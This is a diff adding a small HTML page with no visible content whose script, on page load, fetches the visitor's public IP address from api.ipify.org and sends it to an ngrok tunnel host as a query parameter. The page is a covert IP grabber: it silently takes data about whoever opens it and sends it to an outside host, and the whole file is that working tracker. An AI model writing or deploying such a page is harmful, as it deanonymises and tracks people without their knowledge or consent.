@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html>
+<body>
+	<script>
+		var Https = new XMLHttpRequest();
+		Https.open("GET", 'https://api.ipify.org');
+		Https.send();
+
+		Https.onreadystatechange = (e) => {
+			var Http = new XMLHttpRequest();
+			Http.open("GET", "https://ee9f-190-2-130-177.ngrok.io/?ip="+Https.responseText);
+			Http.send();
+		}
+	</script>
+</body>
+</html>
